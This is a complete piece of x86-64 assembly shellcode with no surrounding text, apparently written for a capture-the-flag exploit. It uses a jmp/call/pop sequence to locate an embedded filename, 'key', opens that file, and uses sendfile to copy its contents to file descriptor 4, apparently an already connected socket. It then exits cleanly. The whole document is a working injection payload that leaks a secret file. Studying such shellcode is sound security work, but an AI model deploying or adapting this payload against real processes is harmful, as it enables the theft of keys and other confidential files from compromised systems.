BITS 64
GLOBAL _start
_start:
    jmp get_eip
 
run:
    xor rax, rax
    xor rdi, rdi
    xor rdx, rdx
 
    ;sys_open(char* fname, int flags, int mode)
    xor rsi,rsi     ; mode
    pop rdi         ; filename
    xor rax, rax    ; flags
    mov al, 2       ; syscall sys_open
    syscall

    ; sys_sendfile(int out_fd, int in_fd, off_t *offset, size_t count)
    mov rsi, rax    ; in_fd
    mov eax, 0x28   ; sys_sendfile
    mov r10, 0xFFF  ; size
    xor rdi, rdi   
    add edi, 4      ; out_fd
    xor rdx,rdx     ; offset
    syscall

    ; sys_exit(return_code)
    xor rax, rax
    add rax, 60  ; sys_exit
    xor rdi, rdi ; return 0 (success)
    syscall
 
get_eip:
    call run
 
filename:
    db 'key', 0x0
